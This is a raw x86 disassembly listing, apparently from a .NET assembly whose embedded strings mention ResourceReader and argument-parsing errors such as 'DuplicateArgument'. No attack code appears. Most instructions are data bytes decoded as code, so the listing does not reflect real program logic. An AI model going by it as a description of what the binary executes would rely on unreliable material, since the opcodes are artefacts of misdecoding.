  4032d7:	add    BYTE PTR [eax],al
  4032d9:	add    al,0x2a
  4032db:	push   ds
  4032dc:	add    bh,BYTE PTR [ebx+0x47]
  4032df:	add    BYTE PTR [eax],al
  4032e1:	add    al,0x2a
  4032e3:	and    al,BYTE PTR [edx]
  4032e5:	add    edi,DWORD PTR [ebp+0x47]
  4032e8:	add    BYTE PTR [eax],al
  4032ea:	add    al,0x2a
  4032ec:	sbb    esi,DWORD PTR [eax]
  4032ee:	add    al,BYTE PTR [eax]
  4032f0:	cmp    eax,DWORD PTR [eax]
  4032f2:	add    BYTE PTR [eax],al
  4032f4:	and    eax,DWORD PTR [eax]
  4032f6:	add    BYTE PTR [ecx],dl
  4032f8:	push   ss
  4032f9:	or     al,BYTE PTR [edx]
  4032fb:	jnp    0x403345
  4032fd:	add    BYTE PTR [eax],al
  4032ff:	add    al,0x25
  403301:	or     edx,DWORD PTR [edx]
  403303:	add    BYTE PTR [eax],ch
  403305:	push   0x20a0000
  40330a:	add    edi,DWORD PTR [ebp+0x49]
  40330d:	add    BYTE PTR [eax],al
  40330f:	add    al,0x3
  403311:	sub    al,0x13
  403313:	add    bh,BYTE PTR [ebx+0x4a]
  403316:	add    BYTE PTR [eax],al
  403318:	add    al,0x2c
  40331a:	or     eax,DWORD PTR [edx]
  40331c:	jnp    0x403368
  40331e:	add    BYTE PTR [eax],al
  403320:	add    al,0x6f
  403322:	xchg   esp,eax
  403323:	add    BYTE PTR [eax],al
  403325:	or     bl,dh
  403327:	or     al,BYTE PTR [esi]
  403329:	sub    al,0x6
  40332b:	pop    es
  40332c:	sub    BYTE PTR [ebx+0x0],ch
  40332f:	add    BYTE PTR [edx],cl
  403331:	fsubr  QWORD PTR [edx]
  403333:	add    BYTE PTR [ecx],al
  403335:	adc    BYTE PTR [eax],al
  403337:	add    BYTE PTR [edx],al
  403339:	add    BYTE PTR [edx],al
  40333b:	add    BYTE PTR [esi],ch
  40333d:	xor    BYTE PTR [eax],al
  40333f:	or     al,BYTE PTR [eax]
  403341:	add    BYTE PTR [eax],al
  403343:	add    BYTE PTR [ebx],bl
  403345:	xor    BYTE PTR [edx],al
  403347:	add    BYTE PTR ds:0x23000000,dh
  40334d:	add    BYTE PTR [eax],al
  40334f:	adc    DWORD PTR [esi],edx
  403351:	or     al,BYTE PTR [edx]
  403353:	jnp    0x40339d
  403355:	add    BYTE PTR [eax],al
  403357:	add    al,0x25
  403359:	or     edx,DWORD PTR [edx]
  40335b:	add    BYTE PTR [eax],ch
  40335d:	push   0x20a0000
  403362:	jnp    0x4033ad
  403364:	add    BYTE PTR [eax],al
  403366:	add    al,0x2c
  403368:	or     DWORD PTR [esp+ebp*1],eax
  40336b:	or     al,0x73
  40336d:	xchg   ebp,eax
  40336e:	add    BYTE PTR [eax],al
  403370:	or     bh,BYTE PTR [edx+0x3]
  403373:	outs   dx,DWORD PTR ds:[esi]
  403374:	add    BYTE PTR [bx+si],al
  403377:	or     bl,dh
  403379:	or     al,BYTE PTR [esi]
  40337b:	sub    al,0x6
  40337d:	pop    es
  40337e:	sub    BYTE PTR [ebx+0x0],ch
  403381:	add    BYTE PTR [edx],cl
  403383:	fsubr  QWORD PTR [edx]
  403385:	add    BYTE PTR [eax],al
  403387:	add    BYTE PTR [ecx],al
  403389:	adc    BYTE PTR [eax],al
  40338b:	add    BYTE PTR [edx],al
  40338d:	add    BYTE PTR [edx],al
  40338f:	add    BYTE PTR [eax],ch
  403391:	sub    al,BYTE PTR [eax]
  403393:	or     al,BYTE PTR [eax]
  403395:	add    BYTE PTR [eax],al
  403397:	add    BYTE PTR [esi],bl
  403399:	add    ch,BYTE PTR [eax]
  40339b:	pop    ss
  40339c:	add    BYTE PTR [eax],al
  40339e:	or     ch,BYTE PTR [edx]
  4033a0:	sbb    esi,DWORD PTR [eax]
  4033a2:	add    al,BYTE PTR [eax]
  4033a4:	add    BYTE PTR es:[eax],al
  4033a7:	add    BYTE PTR [eax+eax*1],ah
  4033aa:	add    BYTE PTR [ecx],dl
  4033ac:	add    bh,BYTE PTR [ebx+0x6e]
  4033af:	add    BYTE PTR [eax],al
  4033b1:	add    al,0x6f
  4033b3:	add    BYTE PTR [bx+si],al
  4033b6:	or     bl,dh
  4033b8:	sbb    BYTE PTR [esi],ah
  4033ba:	add    dh,BYTE PTR [ebx-0x6b]
  4033bd:	add    BYTE PTR [eax],al
  4033bf:	or     bh,BYTE PTR [ebp+0x6d]
  4033c2:	add    BYTE PTR [eax],al
  4033c4:	add    al,0xde
  4033c6:	or     cl,BYTE PTR [edx]
  4033c8:	add    al,BYTE PTR [esi]
  4033ca:	jge    0x403439
  4033cc:	add    BYTE PTR [eax],al
  4033ce:	add    al,0xde
  4033d0:	add    BYTE PTR [edx],ch
  4033d2:	add    BYTE PTR [eax],al
  4033d4:	add    DWORD PTR [eax+eax*1],ebx
  4033d7:	add    BYTE PTR [eax],al
  4033d9:	add    BYTE PTR [eax],al
  4033db:	add    BYTE PTR ds:0x7c0e000d,cl
  4033e1:	add    BYTE PTR [eax],al
  4033e3:	add    DWORD PTR [eax],eax
  4033e5:	add    BYTE PTR [eax],al
  4033e7:	add    BYTE PTR ds:0x2f0a001b,cl
  4033ed:	add    BYTE PTR [eax],al
  4033ef:	add    DWORD PTR [ebx],ebx
  4033f1:	xor    BYTE PTR [ebx],al
  4033f3:	add    ch,dl
  4033f5:	add    BYTE PTR [eax],al
  4033f7:	add    BYTE PTR ds:0x73110000,ah
  4033fd:	mov    ds:0xd060000,eax
  403402:	or     DWORD PTR [ebx],eax
  403404:	jge    0x403474
  403406:	add    BYTE PTR [eax],al
  403408:	add    al,0x9
  40340a:	adc    al,0x7d
  40340c:	ins    DWORD PTR es:[edi],dx
  40340d:	add    BYTE PTR [eax],al
  40340f:	add    al,0x9
  403411:	inc    BYTE PTR [esi]
  403413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403414:	add    BYTE PTR [eax],al
  403416:	push   es
  403417:	jae    0x4033af
  403419:	add    BYTE PTR [eax],al
  40341b:	or     cl,BYTE PTR [edx]
  40341d:	push   ss
  40341e:	or     eax,DWORD PTR [edx]
  403420:	jnp    0x40346a
  403422:	add    BYTE PTR [eax],al
  403424:	add    al,0x25
  403426:	adc    eax,DWORD PTR [edx+edx*1]
  403429:	add    DWORD PTR [eax],ebp
  40342b:	push   0x20a0000
  403430:	jnp    0x40347b
  403432:	add    BYTE PTR [eax],al
  403434:	add    al,0x2c
  403436:	push   es
  403437:	jae    0x4033ce
  403439:	add    BYTE PTR [eax],al
  40343b:	or     bh,BYTE PTR [edx+0x2]
  40343e:	jnp    0x40348a
  403440:	add    BYTE PTR [eax],al
  403442:	add    al,0x2c
  403444:	or     esi,DWORD PTR [edx-0x17]
  403447:	add    DWORD PTR [eax],eax
  403449:	jo     0x4034be
  40344b:	xchg   edi,eax
  40344c:	add    BYTE PTR [eax],al
  40344e:	or     bh,BYTE PTR [edx+0x2]
  403451:	push   es
  403452:	jae    0x4033ec
  403454:	add    BYTE PTR [eax],al
  403456:	or     bh,BYTE PTR [ebp+0x4a]
  403459:	add    BYTE PTR [eax],al
  40345b:	add    al,0x2
  40345d:	jnp    0x4034a9
  40345f:	add    BYTE PTR [eax],al
  403461:	add    al,0x72
  403463:	aaa    
  403464:	add    al,BYTE PTR [eax]
  403466:	jo     0x4034d7
  403468:	cdq    
  403469:	add    BYTE PTR [eax],al
  40346b:	or     al,BYTE PTR [edx]
  40346d:	jnp    0x4034b9
  40346f:	add    BYTE PTR [eax],al
  403471:	add    al,0x17
  403473:	outs   dx,DWORD PTR ds:[esi]
  403474:	call   0x4a7b:0x20a0000
  40347b:	add    BYTE PTR [eax],al
  40347d:	add    al,0x6f
  40347f:	fwait
  403480:	add    BYTE PTR [eax],al
  403482:	or     bl,dh
  403484:	or     eax,DWORD PTR [edi]
  403486:	sub    al,0x7
  403488:	adc    DWORD PTR [eax+ebp*1],eax
  40348b:	imul   eax,DWORD PTR [eax],0x0
  40348e:	or     bl,ah
  403490:	add    bh,BYTE PTR [ebx+0x4a]
  403493:	add    BYTE PTR [eax],al
  403495:	add    al,0x6f
  403497:	pushf  
  403498:	add    BYTE PTR [eax],al
  40349a:	or     dl,BYTE PTR [esi]
  40349c:	or     al,0x2
  40349e:	jnp    0x4034e8
  4034a0:	add    BYTE PTR [eax],al
  4034a2:	add    al,0x25
  4034a4:	adc    eax,DWORD PTR ds:0x68280212
  4034aa:	add    BYTE PTR [eax],al
  4034ac:	or     al,BYTE PTR [edx]
  4034ae:	adc    al,0x7d
  4034b0:	dec    edx
  4034b1:	add    BYTE PTR [eax],al
  4034b3:	add    al,0x9
  4034b5:	jnp    0x403524
  4034b7:	add    BYTE PTR [eax],al
  4034b9:	add    al,0x2c
  4034bb:	pop    es
  4034bc:	or     DWORD PTR [ebx+0x6d],edi
  4034bf:	add    BYTE PTR [eax],al
  4034c1:	add    al,0x7a
  4034c3:	fimul  WORD PTR [ebx]
  4034c5:	or     BYTE PTR [edi+eax*1],ch
  4034c8:	adc    DWORD PTR ds:0x6b28,eax
  4034ce:	or     bl,ah
  4034d0:	sub    al,BYTE PTR [eax]
  4034d2:	add    BYTE PTR [eax],al
  4034d4:	add    DWORD PTR [eax+eax*1],ebx
  4034d7:	add    BYTE PTR [edx],al
  4034d9:	add    BYTE PTR [ebx],ah
  4034db:	add    BYTE PTR [esi-0x77],ah
  4034de:	add    BYTE PTR [ebx],cl
  4034e0:	add    BYTE PTR [eax],al
  4034e2:	add    BYTE PTR [eax],al
  4034e4:	add    al,BYTE PTR [eax]
  4034e6:	mov    eax,ds:0xc92800
  4034eb:	or     eax,DWORD PTR [eax]
  4034ed:	add    BYTE PTR [eax],al
  4034ef:	add    BYTE PTR [edx+0x2],cl
  4034f2:	jae    0x40350b
  4034f4:	add    BYTE PTR [eax],al
  4034f6:	or     bh,BYTE PTR [ebp+0x48]
  4034f9:	add    BYTE PTR [eax],al
  4034fb:	add    al,0x2
  4034fd:	sub    BYTE PTR [edi],dl
  4034ff:	add    BYTE PTR [eax],al
  403501:	or     ch,BYTE PTR [edx]
  403503:	add    BYTE PTR [eax],al
  403505:	add    BYTE PTR [eax],al
  403507:	add    BYTE PTR [esi],cl
  403509:	add    al,BYTE PTR [eax]
  40350b:	add    dh,cl
  40350d:	retf   0xbeef
  403510:	add    DWORD PTR [eax],eax
  403512:	add    BYTE PTR [eax],al
  403514:	xchg   ecx,eax
  403515:	add    BYTE PTR [eax],al
  403517:	add    BYTE PTR [ebx+edx*2+0x79],ch
  40351b:	jae    0x403591
  40351d:	gs ins DWORD PTR es:[edi],dx
  40351f:	cs push edx
  403521:	gs jae 0x403593
  403524:	jne    0x403598
  403526:	arpl   WORD PTR [ebp+0x73],sp
  403529:	cs push edx
  40352b:	gs jae 0x40359d
  40352e:	jne    0x4035a2
  403530:	arpl   WORD PTR [ebp+0x52],sp
  403533:	gs popa 
  403535:	fs gs jb 0x403565
  403539:	and    BYTE PTR [ebp+0x73],ch
  40353c:	arpl   WORD PTR [edi+0x72],bp
  40353f:	ins    BYTE PTR es:[edi],dx
  403540:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  403547:	jae    0x4035b2
  403549:	outs   dx,DWORD PTR ds:[esi]
  40354a:	outs   dx,BYTE PTR ds:[esi]
  40354b:	cmp    eax,0x2e302e34
  403550:	xor    BYTE PTR [esi],ch
  403552:	xor    BYTE PTR [eax+eiz*1],ch
  403555:	inc    ebx
  403556:	jne    0x4035c4
  403558:	je     0x4035cf
  40355a:	jb     0x4035c1
  40355c:	cmp    eax,0x7475656e
  403561:	jb     0x4035c4
  403563:	ins    BYTE PTR es:[edi],dx
  403564:	sub    al,0x20
  403566:	push   eax
  403567:	jne    0x4035cb
  403569:	ins    BYTE PTR es:[edi],dx
  40356a:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  403571:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  403575:	bound  esi,QWORD PTR [edi]
  403577:	aaa    
  403578:	popa   
  403579:	xor    eax,0x31363563
  40357e:	cmp    DWORD PTR [ebx],esi
  403580:	xor    al,0x65
  403582:	xor    BYTE PTR [eax],bh
  403584:	cmp    DWORD PTR [ebx],esp
  403586:	push   ebx
  403587:	jns    0x4035fc
  403589:	je     0x4035f0
  40358b:	ins    DWORD PTR es:[edi],dx
  40358c:	cs push edx
  40358e:	gs jae 0x403600
  403591:	jne    0x403605
  403593:	arpl   WORD PTR [ebp+0x73],sp
  403596:	cs push edx
  403598:	jne    0x403608
  40359a:	je     0x403605
  40359c:	ins    DWORD PTR es:[edi],dx
  40359d:	gs push edx
  40359f:	gs jae 0x403611
  4035a2:	jne    0x403616
  4035a4:	arpl   WORD PTR [ebp+0x53],sp
  4035a7:	gs je  0x4035ac
  4035aa:	add    BYTE PTR [eax],al
  4035ac:	add    BYTE PTR [eax+eax*1],al
  4035af:	add    BYTE PTR [eax],al
  4035b1:	add    BYTE PTR [eax],al
  4035b3:	add    BYTE PTR [eax],al
  4035b5:	push   eax
  4035b6:	inc    ecx
  4035b7:	inc    esp
  4035b8:	push   eax
  4035b9:	inc    ecx
  4035ba:	inc    esp
  4035bb:	push   eax
  4035bc:	imul   eax,DWORD PTR [esi-0x68],0xffffff9a
  4035c0:	mov    DWORD PTR [ebp+0x13],eax
  4035c3:	mov    bl,0xbe
  4035c5:	lds    esi,FWORD PTR [esi-0xc]
  4035c8:	cmp    BYTE PTR [edi+eax*8+0x3a],al
  4035cc:	xchg   edi,eax
  4035cd:	add    BYTE PTR [eax],al
  4035cf:	add    BYTE PTR [esi+0x0],ch
  4035d2:	add    BYTE PTR [eax],al
  4035d4:	cmp    DWORD PTR [eax],eax
  4035d6:	add    BYTE PTR [eax],al
  4035d8:	add    BYTE PTR [eax],al
  4035da:	add    BYTE PTR [eax],al
  4035dc:	xchg   esi,eax
  4035dd:	add    DWORD PTR [eax],eax
  4035df:	add    BYTE PTR [esp+eax*2],dh
  4035e2:	add    BYTE PTR [ebp+0x0],dh
  4035e5:	jo     0x4035e7
  4035e7:	ins    BYTE PTR es:[edi],dx
  4035e8:	add    BYTE PTR [ecx+0x0],ch
  4035eb:	arpl   WORD PTR [eax],ax
  4035ed:	popa   
  4035ee:	add    BYTE PTR [eax+eax*1+0x65],dh
  4035f2:	add    BYTE PTR [ebx+0x0],al
  4035f5:	outs   dx,DWORD PTR ds:[esi]
  4035f6:	add    BYTE PTR [ebp+0x0],ch
  4035f9:	ins    DWORD PTR es:[edi],dx
  4035fa:	add    BYTE PTR [ecx+0x0],ah
  4035fd:	outs   dx,BYTE PTR ds:[esi]
  4035fe:	add    BYTE PTR [eax+eax*1+0x4c],ah
  403602:	add    BYTE PTR [ecx+0x0],ch
  403605:	outs   dx,BYTE PTR ds:[esi]
  403606:	add    BYTE PTR [ebp+0x0],ah
  403609:	dec    edi
  40360a:	add    BYTE PTR [eax+0x0],dh
  40360d:	je     0x40360f
  40360f:	imul   eax,DWORD PTR [eax],0x6e006f
  403615:	add    BYTE PTR [eax],al
  403617:	add    BYTE PTR [eax],al
  403619:	xor    BYTE PTR [ecx+0x0],cl
  40361c:	outs   dx,BYTE PTR ds:[esi]
  40361d:	add    BYTE PTR [esi+0x0],dh
  403620:	popa   
  403621:	add    BYTE PTR [eax+eax*1+0x69],ch
  403625:	add    BYTE PTR [eax+eax*1+0x43],ah
  403629:	add    BYTE PTR [edi+0x0],ch
  40362c:	ins    DWORD PTR es:[edi],dx
  40362d:	add    BYTE PTR [ebp+0x0],ch
  403630:	popa   
  403631:	add    BYTE PTR [esi+0x0],ch
  403634:	add    BYTE PTR fs:[eax+eax*1+0x69],cl
  403639:	add    BYTE PTR [esi+0x0],ch
  40363c:	add    BYTE PTR gs:[edi+0x0],cl
  403640:	jo     0x403642
  403642:	je     0x403644
  403644:	imul   eax,DWORD PTR [eax],0x6e006f
  40364a:	sbb    BYTE PTR [eax],al
  40364c:	add    BYTE PTR [eax],al
  40364e:	and    al,0x4d
  403650:	add    BYTE PTR [ecx+0x0],ch
  403653:	jae    0x403655
  403655:	jae    0x403657
  403657:	imul   eax,DWORD PTR [eax],0x67006e
  40365d:	dec    edi
  40365e:	add    BYTE PTR [eax+0x0],dh
  403661:	je     0x403663
  403663:	imul   eax,DWORD PTR [eax],0x6e006f
  403669:	push   esi
  40366a:	add    BYTE PTR [ecx+0x0],ah
  40366d:	ins    BYTE PTR es:[edi],dx
  40366e:	add    BYTE PTR [ebp+0x0],dh
  403671:	add    BYTE PTR gs:[ebx],dh
  403674:	add    BYTE PTR [eax],al
  403676:	add    BYTE PTR [esi],ah
  403678:	push   ebx
  403679:	add    BYTE PTR [ebp+0x0],dh
  40367c:	arpl   WORD PTR [eax],ax
  40367e:	arpl   WORD PTR [eax],ax
  403680:	add    BYTE PTR gs:[ebx+0x0],dh
  403684:	jae    0x403686
  403686:	data16 add BYTE PTR [ebp+0x0],dh
  40368a:	ins    BYTE PTR es:[edi],dx
  40368b:	add    BYTE PTR [ebp+0x0],al
  40368e:	js     0x403690
  403690:	add    BYTE PTR gs:[ebx+0x0],ah
  403694:	jne    0x403696
  403696:	je     0x403698
  403698:	imul   eax,DWORD PTR [eax],0x6e006f
  40369e:	push   esp
  40369f:	add    BYTE PTR [eax],al
  4036a1:	add    BYTE PTR [ecx],al
  4036a3:	push   ss
  4036a4:	inc    esp
  4036a5:	jne    0x403717
  4036a7:	ins    BYTE PTR es:[edi],dx
  4036a8:	imul   esp,DWORD PTR [ebx+0x61],0x61206574
  4036af:	jb     0x403718
  4036b1:	jne    0x403720
  4036b3:	outs   dx,BYTE PTR gs:[esi]
  4036b5:	je     0x4036d7
  4036b7:	jnp    0x4036e9
  4036b9:	jge    0x4036bc
  4036bb:	sbb    DWORD PTR [ebp+0x6e],edx
  4036be:	jb     0x403725
  4036c0:	arpl   WORD PTR [edi+0x67],bp
  4036c3:	outs   dx,BYTE PTR ds:[esi]
  4036c4:	imul   edi,DWORD PTR [edx+0x65],0x72612064
  4036cb:	addr16 jne 0x40373b
  4036ce:	outs   dx,BYTE PTR gs:[esi]
  4036d0:	je     0x4036f2
  4036d2:	jnp    0x403704
  4036d4:	jge    0x4036d7
  4036d6:	pop    ds
  4036d7:	push   esi
  4036d8:	popa   
  4036d9:	ins    BYTE PTR es:[edi],dx
  4036da:	jne    0x403741
  4036dc:	and    BYTE PTR [ebp+0x78],ah
  4036df:	jo     0x403746
  4036e1:	arpl   WORD PTR [ebp+eiz*2+0x64],si
  4036e5:	and    BYTE PTR [esi+0x6f],ah
  4036e8:	jb     0x40370a
  4036ea:	popa   
  4036eb:	jb     0x403754
  4036ed:	jne    0x40375c
  4036ef:	outs   dx,BYTE PTR gs:[esi]
  4036f1:	je     0x403713
  4036f3:	jnp    0x403725
  4036f5:	jge    0x4036f8
  4036f7:	and    dl,BYTE PTR [eax+ebp*2+0x65]
  4036fb:	and    BYTE PTR [ebx+0x6f],ah
  4036fe:	ins    DWORD PTR es:[edi],dx
  4036ff:	ins    DWORD PTR es:[edi],dx
  403700:	popa   
  403701:	outs   dx,BYTE PTR ds:[esi]
  403702:	and    BYTE PTR fs:[ebx+0x6f],ah
  403706:	ins    DWORD PTR es:[edi],dx
  403707:	jo     0x403775
  403709:	gs je  0x403771
  40370c:	and    BYTE PTR fs:[ebx+0x75],dh
  403710:	arpl   WORD PTR [ebx+0x65],sp
  403713:	jae    0x403788
  403715:	data16 jne 0x403784
  403718:	ins    BYTE PTR es:[edi],dx
  403719:	jns    0x40371b
  40371b:	add    BYTE PTR [eax],al
  40371d:	add    BYTE PTR [eax],al
  40371f:	add    al,ch
  403721:	add    BYTE PTR [eax],al
  403723:	add    dh,cl
  403725:	retf   0xbeef
  403728:	add    DWORD PTR [eax],eax
  40372a:	add    BYTE PTR [eax],al
  40372c:	xchg   ecx,eax
  40372d:	add    BYTE PTR [eax],al
  40372f:	add    BYTE PTR [ebx+edx*2+0x79],ch
  403733:	jae    0x4037a9
  403735:	gs ins DWORD PTR es:[edi],dx
  403737:	cs push edx
  403739:	gs jae 0x4037ab
  40373c:	jne    0x4037b0
  40373e:	arpl   WORD PTR [ebp+0x73],sp
  403741:	cs push edx
  403743:	gs jae 0x4037b5
  403746:	jne    0x4037ba
  403748:	arpl   WORD PTR [ebp+0x52],sp
  40374b:	gs popa 
  40374d:	fs gs jb 0x40377d
  403751:	and    BYTE PTR [ebp+0x73],ch
  403754:	arpl   WORD PTR [edi+0x72],bp
  403757:	ins    BYTE PTR es:[edi],dx
  403758:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  40375f:	jae    0x4037ca
  403761:	outs   dx,DWORD PTR ds:[esi]
  403762:	outs   dx,BYTE PTR ds:[esi]
  403763:	cmp    eax,0x2e302e34
  403768:	xor    BYTE PTR [esi],ch
  40376a:	xor    BYTE PTR [eax+eiz*1],ch
  40376d:	inc    ebx
  40376e:	jne    0x4037dc
  403770:	je     0x4037e7
  403772:	jb     0x4037d9
  403774:	cmp    eax,0x7475656e
  403779:	jb     0x4037dc
  40377b:	ins    BYTE PTR es:[edi],dx
  40377c:	sub    al,0x20
  40377e:	push   eax
  40377f:	jne    0x4037e3
  403781:	ins    BYTE PTR es:[edi],dx
  403782:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  403789:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  40378d:	bound  esi,QWORD PTR [edi]
  40378f:	aaa    
  403790:	popa   
  403791:	xor    eax,0x31363563
  403796:	cmp    DWORD PTR [ebx],esi
  403798:	xor    al,0x65
  40379a:	xor    BYTE PTR [eax],bh
  40379c:	cmp    DWORD PTR [ebx],esp
  40379e:	push   ebx
  40379f:	jns    0x403814
  4037a1:	je     0x403808
  4037a3:	ins    DWORD PTR es:[edi],dx
  4037a4:	cs push edx
  4037a6:	gs jae 0x403818
  4037a9:	jne    0x40381d
  4037ab:	arpl   WORD PTR [ebp+0x73],sp
  4037ae:	cs push edx
  4037b0:	jne    0x403820
  4037b2:	je     0x40381d
  4037b4:	ins    DWORD PTR es:[edi],dx
  4037b5:	gs push edx
  4037b7:	gs jae 0x403829
  4037ba:	jne    0x40382e
  4037bc:	arpl   WORD PTR [ebp+0x53],sp
  4037bf:	gs je  0x4037c4
  4037c2:	add    BYTE PTR [eax],al
  4037c4:	add    BYTE PTR [ecx],al
  4037c6:	add    BYTE PTR [eax],al
  4037c8:	add    BYTE PTR [eax],al
  4037ca:	add    BYTE PTR [eax],al
  4037cc:	add    BYTE PTR [eax+0x41],dl
  4037cf:	inc    esp
  4037d0:	push   eax
  4037d1:	inc    ecx
  4037d2:	inc    esp
  4037d3:	push   eax
  4037d4:	xchg   cl,bh
  4037d6:	aaa    
  4037d7:	lock add BYTE PTR [eax],al
  4037da:	add    BYTE PTR [eax],al
  4037dc:	fld    DWORD PTR [eax]
  4037de:	add    BYTE PTR [eax],al
  4037e0:	sbb    BYTE PTR [ecx+0x0],al
  4037e3:	arpl   WORD PTR [eax],ax
  4037e5:	arpl   WORD PTR [eax],ax
  4037e7:	add    BYTE PTR gs:[ebx+0x0],dh
  4037eb:	jae    0x4037ed
  4037ed:	inc    esp
  4037ee:	add    BYTE PTR [ebp+0x0],ah
  4037f1:	outs   dx,BYTE PTR ds:[esi]
  4037f2:	add    BYTE PTR [ecx+0x0],ch
  4037f5:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  4037fa:	add    BYTE PTR [eax],al
  4037fc:	add    BYTE PTR [ecx],al
  4037fe:	or     eax,0x65636341
  403803:	jae    0x403878
  403805:	and    BYTE PTR [ebp+eiz*2+0x6e],al
  403809:	imul   esp,DWORD PTR [ebp+0x64],0x424a5342
  403810:	add    DWORD PTR [eax],eax
  403812:	add    DWORD PTR [eax],eax
  403814:	add    BYTE PTR [eax],al
  403816:	add    BYTE PTR [eax],al
  403818:	or     al,0x0
  40381a:	add    BYTE PTR [eax],al
  40381c:	jbe    0x403852
  40381e:	xor    BYTE PTR cs:[esi],ch
  403821:	xor    esi,DWORD PTR [eax]
  403823:	xor    esi,DWORD PTR [ecx]
  403825:	cmp    DWORD PTR [eax],eax
  403827:	add    BYTE PTR [eax],al
  403829:	add    BYTE PTR ds:0x6c00,al
  40382f:	add    BYTE PTR [ebp+ebx*1+0x7e230000],bh
  403836:	add    BYTE PTR [eax],al
  403838:	sub    BYTE PTR [esi],bl
  40383a:	add    BYTE PTR [eax],al
  40383c:	mov    WORD PTR [ebx],fs
  40383e:	add    BYTE PTR [eax],al
  403840:	and    edx,DWORD PTR [ebx+0x74]
  403843:	jb     0x4038ae
  403845:	outs   dx,BYTE PTR ds:[esi]
  403846:	addr16 jae 0x403849
  403849:	add    BYTE PTR [eax],al
  40384b:	add    BYTE PTR [ecx+eax*2+0x27c0000],dh
  403852:	add    BYTE PTR [eax],al
  403854:	and    edx,DWORD PTR [ebp+0x53]
  403857:	add    BYTE PTR [eax],dh
  403859:	inc    esp
  40385a:	add    BYTE PTR [eax],al
  40385c:	adc    BYTE PTR [eax],al
  40385e:	add    BYTE PTR [eax],al
  403860:	and    eax,DWORD PTR [edi+0x55]
  403863:	dec    ecx
  403864:	inc    esp
  403865:	add    BYTE PTR [eax],al
  403867:	add    BYTE PTR [eax+0x44],al
  40386a:	add    BYTE PTR [eax],al
  40386c:	js     0x403883
  40386e:	add    BYTE PTR [eax],al
  403870:	and    eax,DWORD PTR [edx+0x6c]
  403873:	outs   dx,DWORD PTR ds:[esi]
  403874:	bound  eax,QWORD PTR [eax]
  403876:	add    BYTE PTR [eax],al
  403878:	add    BYTE PTR [eax],al
  40387a:	add    BYTE PTR [eax],al
  40387c:	add    al,BYTE PTR [eax]
  40387e:	add    BYTE PTR [ecx],al
  403880:	push   edi
  403881:	pop    ds
  403882:	mov    dh,0x9
  403884:	or     DWORD PTR [ebx],ecx
  403886:	add    BYTE PTR [eax],al
  403888:	add    dl,bh
  40388a:	and    eax,0x160033
  40388f:	add    BYTE PTR [ecx],al
  403891:	add    BYTE PTR [eax],al
  403893:	add    BYTE PTR [esi+0x0],bh
  403896:	add    BYTE PTR [eax],al
  403898:	pop    ds
  403899:	add    BYTE PTR [eax],al
  40389b:	add    BYTE PTR [esi+0x0],ch
  40389e:	add    BYTE PTR [eax],al
  4038a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038a1:	add    BYTE PTR [eax],al
  4038a3:	add    BYTE PTR [ebx+0x6000000],bl
  4038a9:	add    BYTE PTR [eax],al
  4038ab:	add    BYTE PTR [eax+eax*1+0x310000],bl
  4038b2:	add    BYTE PTR [eax],al
  4038b4:	dec    edi
  4038b5:	add    BYTE PTR [eax],al
  4038b7:	add    BYTE PTR ds:0x1000000,ah
  4038bd:	add    BYTE PTR [eax],al
  4038bf:	add    BYTE PTR [ecx],al
  4038c1:	add    BYTE PTR [eax],al
  4038c3:	add    BYTE PTR [eax],cl
  4038c5:	add    BYTE PTR [eax],al
  4038c7:	add    BYTE PTR [eax],dl
  4038c9:	add    BYTE PTR [eax],al
  4038cb:	add    BYTE PTR [eax+eax*1],bl
  4038ce:	add    BYTE PTR [eax],al
  4038d0:	or     al,BYTE PTR [eax]
  4038d2:	add    BYTE PTR [eax],al
  4038d4:	add    DWORD PTR [eax],eax
  4038d6:	add    BYTE PTR [eax],al
  4038d8:	or     BYTE PTR [eax],al
  4038da:	add    BYTE PTR [eax],al
  4038dc:	add    al,BYTE PTR [eax]
  4038de:	add    BYTE PTR [eax],al
  4038e0:	adc    DWORD PTR [eax],eax
  4038e2:	add    BYTE PTR [eax],al
  4038e4:	add    al,BYTE PTR [eax]
  4038e6:	add    BYTE PTR [eax],al
  4038e8:	add    BYTE PTR [eax],al
  4038ea:	or     al,BYTE PTR [eax]
  4038ec:	add    DWORD PTR [eax],eax
  4038ee:	add    BYTE PTR [eax],al
  4038f0:	add    BYTE PTR [eax],al
  4038f2:	push   es
  4038f3:	add    BYTE PTR [ebp+0x601ae01],dh
  4038f9:	add    BYTE PTR [ecx+eax*1+0xa01ae],bh
  403900:	cmc    
  403901:	add    ebp,edx
  403903:	add    DWORD PTR [edx],ecx
  403905:	add    BYTE PTR ds:0xe020602,ah
  40390b:	add    BYTE PTR [ebp+0x2],bh
  40390e:	imul   eax,DWORD PTR [edx],0x28b0006
  403914:	scas   al,BYTE PTR es:[edi]
  403915:	add    DWORD PTR [esi],eax
  403917:	add    BYTE PTR [ebx],al
  403919:	pop    es
  40391a:	out    dx,al
  40391b:	push   es
  40391c:	push   es
  40391d:	add    BYTE PTR [ebx+0x607a207],dh
  403923:	add    BYTE PTR [ecx],al
  403925:	or     al,dh
  403927:	pop    es
  403928:	or     al,BYTE PTR [eax]
  40392a:	ds or  cl,al
  40392d:	add    DWORD PTR [edx],ecx
  40392f:	add    al,bh
  403931:	or     ch,dl
  403933:	add    DWORD PTR [edx],ecx
  403935:	add    BYTE PTR [ebx],cl
  403937:	or     ecx,eax
  403939:	add    DWORD PTR [esi],eax
  40393b:	add    BYTE PTR [edx],bh
  40393d:	or     DWORD PTR [ebx],ebx
  40393f:	or     DWORD PTR [edx],ecx
  403941:	add    BYTE PTR [edi+0x9],al
  403944:	aad    0x1
  403946:	or     al,BYTE PTR [eax]
  403948:	je     0x403953
  40394a:	push   edi
  40394b:	or     DWORD PTR [edx],ecx
  40394d:	add    bl,al
  40394f:	or     DWORD PTR [edi+0x9],edx
  403952:	or     al,BYTE PTR [eax]
  403954:	retf   
  403955:	or     ecx,eax
  403957:	add    DWORD PTR [edx],ecx
  403959:	add    dl,bl
  40395b:	or     ecx,eax
  40395d:	add    DWORD PTR [esi],ecx
  40395f:	add    BYTE PTR [edx],bh
  403961:	or     al,0x69
  403963:	add    dl,BYTE PTR [edx]
